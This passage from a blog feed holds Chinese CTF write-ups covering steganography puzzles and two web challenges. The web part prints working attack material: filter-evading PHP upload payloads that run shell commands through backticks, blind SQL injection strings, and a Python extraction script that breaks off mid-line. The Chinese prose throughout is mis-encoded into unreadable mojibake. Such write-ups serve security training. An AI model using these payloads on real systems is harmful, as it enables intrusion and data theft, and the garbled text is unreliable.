&#x3D; 563</span><br><span class="line">IX &#x3D; 354 </span><br><span class="line">X &#x3D; 996</span><br><span class="line">XI &#x3D; 765</span><br><span class="line">XII &#x3D; 565</span><br></pre></td></tr></table></figure><p>å°†æ‰€å¾—çš„å…¨éƒ¨æ•°å­—æŒ‰ç…§é¡ºåºè¿æ¥èµ·æ¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">510862272870546146189563354996765565</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>long_to_bytes(510862272870546146189563354996765565).decode()</code> å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bctf&#123;JSB&#x2F;rOcKs&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2021.March</title>
      <link href="/zh-CN/posts/9a222575.html"/>
      <url>/zh-CN/posts/9a222575.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€å•çš„pngéšå†™"><a href="#ç®€å•çš„pngéšå†™" class="headerlink" title="ç®€å•çš„pngéšå†™"></a>ç®€å•çš„pngéšå†™</h3><h4 id="å‹ç¼©åŒ…ä¼ªåŠ å¯†ä¿®å¤"><a href="#å‹ç¼©åŒ…ä¼ªåŠ å¯†ä¿®å¤" class="headerlink" title="å‹ç¼©åŒ…ä¼ªåŠ å¯†ä¿®å¤"></a>å‹ç¼©åŒ…ä¼ªåŠ å¯†ä¿®å¤</h4><p>å°†å‹ç¼©åŒ…ä¸­ä¸¤ä¸ªæ–‡ä»¶çš„ deFlags éƒ½ä¿®æ­£ä¸º 0 å³å¯è§£å‹æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616837996482/0c1302082b4a52b9c38782c04e5ab4b889a89571.png"></p><h4 id="æ–‡ä»¶ç»“æ„ä¿®æ­£"><a href="#æ–‡ä»¶ç»“æ„ä¿®æ­£" class="headerlink" title="æ–‡ä»¶ç»“æ„ä¿®æ­£"></a>æ–‡ä»¶ç»“æ„ä¿®æ­£</h4><p>ä½¿ç”¨ 010 editor æ‰“å¼€ hint.png å¯ä»¥å‘ç° IDAT chunk æœ‰ä¸€äº›ä¸å¯¹åŠ²ï¼ŒçŒœæµ‹è¿™æ˜¯ä¸¤å¼ å›¾ç‰‡çš„æ‹¼æ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838152566/c429fda28f9e9952de0d136b02c6b19da2d141d7.png"></p><p>å°† IDAT chunk åˆ†å¼€å¹¶è¡¥å…¨æ–‡ä»¶å¤´å¯ä»¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1616838199878/d1c1614e32f240c960499445f5d522d9639d940e.png"></p><h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p>ä½¿ç”¨ä¸Šè¿°å¯†ç å¯¹ flag.jpg ä½¿ç”¨ outguess æå–å†…å®¹å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MUY4QjA4MDg5MTgwNzg1RTAwMDM2NjZDNjE2NzJFNzQ3ODc0MDA0QkNCNDk0Q0FGMzZCMDMwMzQ0RDM1NDlCNjRDMzMzNTMzMzRCMTQ4MzVCNzQ4NEEzNTMzNDg0OTMyMzU0QjRFMzUzMTQ5MzFCNUFDRTVFMjAyMDA0NjhCMjIzRjI4MDAwMDAw</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ CyberChef å¯¹ä¸Šè¿°ä¿¡æ¯ç»è¿‡ <code>From Base64 --&gt; From Hex --&gt; Gunzip</code> å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0815e4c9f56148e78be60db56ce44d59&#125;</span><br></pre></td></tr></table></figure><h3 id="é›¾éƒ½å­¤å„¿"><a href="#é›¾éƒ½å­¤å„¿" class="headerlink" title="é›¾éƒ½å­¤å„¿"></a>é›¾éƒ½å­¤å„¿</h3><p>ä½¿ç”¨ <a href="https://www.bertnase.de/npiet/npiet-execute.php">npiet</a> æ‰§è¡Œé™„ä»¶ä¸­çš„å›¾ç‰‡ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617292938118/ed37cb604bdcae59cf5b4e04d8232a395b5a6cb9.png"></p><p>æ‰“å¼€é™„ä»¶çš„ Word æ–‡æ¡£å¯ä»¥å‘ç°æœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå°†å…¶ä» Word æ–‡æ¡£ä¸­æå–å‡ºæ¥ï¼Œä½¿ç”¨ <code>Tetris</code> åš key å°è¯•è·‘ outguess  å¹¶å°†æå–å‡ºçš„æ–‡ä»¶æ•´ç†åå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><blockquote><p>åœ¨çº¿ outguess <a href="https://cyber.meme.tips/joutguess/">https://cyber.meme.tips/joutguess/</a></p></blockquote><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000000010011101010111010000001101100000001010110101010110101011011110000000100011010101000010100110111101010011011010100011011110101001101101010111111001001011011011011001101110110101001101000000010010100101111110101100010101110111101010011011011001101111000000110101101010011010000001111000000111110101011000</span><br></pre></td></tr></table></figure><p>å¯¹ Word æ–‡æ¡£ä¸­çš„æ–‡å­—è¿›è¡Œé¢‘æ•°ç»Ÿè®¡ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(&#39;&#123;&#39;, 6), (&#39;A&#39;, 19), (&#39;m&#39;, 502), (&#39;o&#39;, 1620), (&#39;n&#39;, 1467), (&#39;g&#39;, 406), (&#39; &#39;, 4914), (&#39;t&#39;, 1879), (&#39;h&#39;, 1435), (&#39;e&#39;, 2795), (&#39;r&#39;, 1343), (&#39;p&#39;, 454), (&#39;u&#39;, 567), (&#39;b&#39;, 374), (&#39;l&#39;, 906), (&#39;i&#39;, 1449), (&#39;c&#39;, 507), (&#39;d&#39;, 1017), (&#39;s&#39;, 1254), (&#39;a&#39;, 1806), (&#39;w&#39;, 560), (&#39;,&#39;, 444), (&#39;f&#39;, 457), (&#39;y&#39;, 407), (&#39;I&#39;, 59), (&#39;:&#39;, 15), (&#39;k&#39;, 159), (&#39;;&#39;, 82), (&#39;q&#39;, 26), (&#39;v&#39;, 253), (&#39;x&#39;, 41), (&#39;.&#39;, 254), (&#39;\n&#39;, 190), (&#39;F&#39;, 5), (&#39;&#125;&#39;, 8), (&#39;O&#39;, 51), (&#39;T&#39;, 63), (&#39;-&#39;, 84), (&#39;N&#39;, 13), (&#39;z&#39;, 4), (&quot;&#39;&quot;, 236), (&#39;L&#39;, 7), (&#39;!&#39;, 29), (&#39;S&#39;, 14), (&#39;M&#39;, 84), (&#39;P&#39;, 5), (&#39;Y&#39;, 12), (&#39;_&#39;, 16), (&#39;G&#39;, 3), (&#39;H&#39;, 19), (&#39;?&#39;, 17), (&#39;W&#39;, 22), (&#39;B&#39;, 44), (&#39;U&#39;, 3), (&#39;j&#39;, 7), (&#39;E&#39;, 2), (&#39;(&#39;, 9), (&#39;)&#39;, 9), (&#39;D&#39;, 6), (&#39;J&#39;, 1), (&#39;V&#39;, 1), (&#39;Z&#39;, 1), (&#39;C&#39;, 6)]</span><br></pre></td></tr></table></figure><p>å°† outguess æå–å‡ºæ¥çš„å­—ç¬¦ä¸²ä½¿ç”¨ä¸Šè¿°è¯é¢‘è¿›è¡Œå“ˆå¤«æ›¼è§£ç å¯å¾— flagã€‚</p><blockquote><p>è§£ç è„šæœ¬å‚è€ƒï¼š<a href="https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82">https://lemonprefect.cn/WriteUps/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20CTF%202021.html#:~:text=%E7%BD%91%E4%B8%8A%E6%89%BE%E4%B8%80%E6%AE%B5-,%E4%BB%A3%E7%A0%81,-%E8%A7%A3%E7%A0%81%E3%80%82</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;This_Is_Hvffam_Dickens_secret_!!&#125;</span><br></pre></td></tr></table></figure><h3 id="å°ç”°çš„ç§˜å¯†"><a href="#å°ç”°çš„ç§˜å¯†" class="headerlink" title="å°ç”°çš„ç§˜å¯†"></a>å°ç”°çš„ç§˜å¯†</h3><p>ä½¿ç”¨ WireShark åˆ†æé™„ä»¶ç»™å‡ºçš„æµé‡åŒ…ï¼Œè·Ÿè¸ªåˆ° TCP æµ 19 å¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617607566438/c726c350e896d5e2762a06933dd00335dc7f55ee.png"></p><p>å°†å…¶æå–å‡ºæ¥ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¸€æ®µå¤¹æ‚ç€ emoji çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ‡ ğŸŒ· ğŸ‡ğŸ‰ğŸ‡ ğŸŒº ğŸŒ· ğŸ‡ğŸ‰ğŸ ğŸ‡ğŸ¿ğŸ”¤firstğŸ”¤ â¡ï¸ ğŸ”¤c0f1b6a831c399e2ğŸ”¤ğŸ”¤secondğŸ”¤ â¡ï¸ ğŸ”¤9b675bd57058fd46ğŸ”¤ğŸ”¤thirdğŸ”¤â¡ï¸ğŸ”¤e6ae2fec3ad71c77ğŸ”¤ğŸ”¤fourthğŸ”¤ â¡ï¸ ğŸ”¤89f58062f10dd731ğŸ”¤ğŸ”¤fifthğŸ”¤ â¡ï¸ ğŸ”¤6316e53c8cdd9d99ğŸ”¤ğŸ† â¡ï¸ dicâ†ªï¸ ğŸ½dic ğŸ”¤firstğŸ”¤â—ï¸ â¡ï¸ aa ğŸ‡ğŸ˜€ aaâ—ï¸ğŸ‰ğŸ˜€ ğŸ”¤+ğŸ”¤â—ï¸ğŸ¿ ğŸ”¤9ac6133c88aedbd6ğŸ”¤ ğŸ”¤26602a67be14ea8cğŸ”¤ ğŸ”¤73b5f8d8ccd5ad31ğŸ”¤ ğŸ”¤c42125f82a562231ğŸ”¤ ğŸ† â¡ï¸ ğŸ–ï¸ğŸ†•sdascağŸ¹ sdascaâ—ï¸ğŸ˜€ ğŸ½sdasca 0â—ï¸â—ï¸ğŸ‰ğŸ‡ ğŸŸ ğŸ‡ğŸ”‘ ğŸ†• ğŸ‡ğŸ‰â—ï¸ ğŸ™‹ ğŸ‡ğŸ˜€ ğŸ”¤a109e294d1e8155be8aa4ğŸ”¤â—ï¸ğŸ‰ğŸ‰ğŸ‡ ğŸ¡ ğŸŸ ğŸ‡ğŸ”‘ ğŸ†• ğŸ‡ â¤´ï¸ğŸ†•â—ï¸ ğŸ‰âœ’ï¸ â—ï¸ ğŸ™‹ ğŸ‡ğŸ˜€ ğŸ”¤8adf7f2f76030877ğŸ”¤â—ï¸ğŸ‰ğŸ‰ğŸ‡ ğŸ‹ ğŸŸ ğŸ‡ğŸ”‘ ğŸ†• ğŸ‡ â¤´ï¸ğŸ†•â—ï¸ ğŸ‰âœ’ï¸ â—ï¸ ğŸ™‹ ğŸ‡ğŸ˜€ ğŸ”¤eba66e10fba74dbfğŸ”¤â—ï¸ğŸ‰ğŸ‰ğŸ‡ ğŸ  ğŸŸ ğŸ‡ğŸ”‘ ğŸ†• ğŸ‡ â¤´ï¸ğŸ†•â—ï¸ ğŸ‰âœ’ï¸â—ï¸ ğŸ™‹ ğŸ‡ğŸ˜€ ğŸ”¤a7749e813e9e2dbağŸ”¤â—ï¸ ğŸ‰ğŸ‰</span><br></pre></td></tr></table></figure><p>æœç´¢ <code>ğŸ”¤ğŸ”¤thirdğŸ”¤â¡ï¸ğŸ”¤</code> å¾ˆå®¹æ˜“å‘ç°ä¸€äº›å…³äº Emojicode ç›¸å…³çš„å‚è€ƒæ–‡ç« ã€‚</p><blockquote><p><a href="https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html">https://jaxenter.com/emojicode-the-programming-language-you-should-have-dreamed-of-125169.html</a></p><p>emojicode/emojicode: <a href="https://github.com/emojicode/emojicode">https://github.com/emojicode/emojicode</a></p><p>Installation: <a href="https://www.emojicode.org/docs/guides/install.html">https://www.emojicode.org/docs/guides/install.html</a></p></blockquote><p>æŒ‰ç…§å…¶æ–‡æ¡£å®‰è£…å¥½ç¼–è¯‘å™¨å¹¶ç¼–è¯‘ä¸Šè¿°å­—ç¬¦ä¸²å¯ä»¥æˆåŠŸè¿è¡Œå¾—åˆ°å¦‚ä¸‹ç»“æœã€‚ï¼ˆä¸æ˜¯çš„è¯å°±å¤šè¿è¡Œå‡ æ¬¡ï¼‰</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c0f1b6a831c399e2</span><br><span class="line">+</span><br><span class="line">26602a67be14ea8c</span><br></pre></td></tr></table></figure><p>å°†å…¶æ•´ç†ä¸€ä¸‹å¾—åˆ°é™„ä»¶ä¸­å‹ç¼©åŒ…çš„è§£å‹å¯†ç  <code>c0f1b6a831c399e226602a67be14ea8c</code>ã€‚è§£å‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10?:A&#x3D;356142:GOSUB20:A&#x3D;762:GOSUB20:A&#x3D;222440:GOSUB20:END</span><br><span class="line">20A&#x3D;RND(-A)</span><br><span class="line">30A&#x3D;INT(RND(A)*22):IF A THEN ?CHR$(A+64);:GOTO30</span><br><span class="line">40?&quot; &quot;;:RETURN</span><br><span class="line"></span><br><span class="line">RUN</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Commodore64 æ¨¡æ‹Ÿå™¨æ¥è¿è¡Œè¿™æ®µä»£ç ï¼Œå¾—åˆ°äº†ç»“æœ <code>NOT AN EGG</code>ã€‚</p><blockquote><p>Commodore64 Emulator: <a href="https://floooh.github.io/tiny8bit/c64-ui.html">https://floooh.github.io/tiny8bit/c64-ui.html</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1fafe181-0ffe-6812-839b-450103c50eb5/1617611975871/00d95c662d9a4d942ada6cacff6fc459af5a4ac0.png"></p><p>ä½¿ç”¨å¾—åˆ°çš„ç»“æœä½œä¸ºå¯†ç è§£å‹ flag.rar æ–‡ä»¶å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6bffd0d9321df3c229cdff714bb5a0b0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·æ¯ CTF 2021</title>
      <link href="/zh-CN/posts/f33b0bb3.html"/>
      <url>/zh-CN/posts/f33b0bb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><p>é¢˜ç›®ç»™å‡ºå¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>?action=pwd</code> å¾—åˆ°å½“å‰æ²™ç›’è·¯å¾„ <code>sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/</code>ã€‚ä½¿ç”¨ <code>&lt;?=</code> æ ‡ç­¾æ„é€ å‡º payload <code>?action=upload&data=&lt;?=&grave;ls%09/&grave;?></code> ä¹‹åå†è®¿é—®æ²™ç®±è·¯å¾„å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!whatyouwantggggggg401.php bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure><p>æ„é€ å‡º <code>?action=upload&data=&lt;?=&grave;nl%09/!whatyouwantggggggg401.*&grave;?></code> åå†è®¿é—®æ²™ç®±è·¯å¾„æŸ¥çœ‹é¡µé¢æºä»£ç å¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ï¼Œä»è€Œå¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;</span><br></pre></td></tr></table></figure><h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>éšæ‰‹æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»å¯ä»¥å‘ç°å¹¶æ²¡æœ‰ä¸šåŠ¡ç•Œé¢ï¼Œç»“åˆé¢˜ç›®çŒœæµ‹æ˜¯ SQL æ³¨å…¥ï¼Œä¸”æ³¨å…¥ç‚¹åœ¨ç™»å½•æˆ–è€…æ³¨å†Œçš„é¡µé¢ã€‚å› æ­¤æ„é€ å‡ºå¦‚ä¸‹ payload éªŒè¯å¾—åˆ°ä¸€ä¸ªå¸ƒå°”é€»è¾‘ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;1&#x2F;**&#x2F;In&#x2F;**&#x2F;(1)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure><p>äºæ˜¯å°è¯•è¯»å–å‡ºæ•°æ®åº“åï¼Œæ­¤æ—¶å¯ä»¥å‘ç°å¾ˆå¤šå­—ç¬¦è¢« ban äº†ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹éƒ¨åˆ†é‡åˆ°çš„å­—ç¬¦ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or,and,&#x3D;,&gt;,&lt;,substr,if,[ç©ºæ ¼],+,-</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å¯ä»¥é‡‡ç”¨ <code>In (1,2,3...)</code> çš„æ–¹å¼æ¥äºŒåˆ†ç›²æ³¨ï¼Œä½¿ç”¨ <code>case when ... then ... else ... end</code> çš„è¯­æ³•æ¥åšé€»è¾‘åˆ¤æ–­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ <code>in</code> å¹¶ä¸æ˜¯åŒ¹é…ä¸€ä¸ªåŒºé—´è€Œæ˜¯éœ€è¦ç©·ä¸¾ï¼Œè­¬å¦‚ <code>select (2 in (1,3))</code> è¿”å›çš„å°†ä¼šæ˜¯ 0ï¼Œåº”ä¸ºæ­¤æ—¶çš„ 2 æ—¢ä¸æ˜¯ 1 ä¹Ÿä¸æ˜¯ 3ã€‚å› ä¸º <code>substr</code> è¢«ç¦ç”¨ï¼Œå› æ­¤é‡‡ç”¨ <code>left(reverse(left(&#123;sql&#125;,n)),1)</code> çš„åŠæ³•æ¥è¯»åˆ°æ¯ä¸€ä½ã€‚æ­¤æ—¶æ„é€ å‡ºå¦‚ä¸‹ä¸¤ä¸ª payload å³å¯éªŒè¯å¯è¡Œæ€§ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(99)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(0)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬ç”¨äºŒåˆ†æ³•æŸ¥å‡ºè¡¨åã€‚å› ä¸º <code>or</code> è¢«ç¦ç”¨å¯¼è‡´æ²¡æœ‰ <code>information_schema</code> å¯ç”¨ï¼Œæ­¤æ—¶å¯ä»¥é‡‡ç”¨ <code>mysql.innodb_table_stats</code> ä»£æ›¿å…¶æŸ¥å‡ºè¡¨åã€‚å› ä¸ºæ— æ³•æŸ¥å‡ºåˆ—åï¼Œå› æ­¤é‡‡ç”¨æ— åˆ—åæ³¨å…¥ã€‚å†™ä¸ªè„šæœ¬è·‘å‡º flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;.../login.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    keywords = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># sqlContent = &quot;select/**/database()&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf</span></span><br><span class="line">            <span class="comment"># sqlContent = &quot;select group_concat(table_name) from mysql.innodb_table_stats&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf,f1ag,gtid_slave_pos</span></span><br><span class="line">            sqlContent = <span class="string">&quot;select group_concat(b) from (select 1 as b union select * from f1ag)a&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)  <span class="comment">#1,flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;nullnull\&quot;/**/||/**/(case/**/when(ascii(left(reverse(left((<span class="subst">&#123;sqlContent&#125;</span>),<span class="subst">&#123;i&#125;</span>)),1)))/**/in/**/(<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(low, mid + <span class="number">1</span>))).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27; 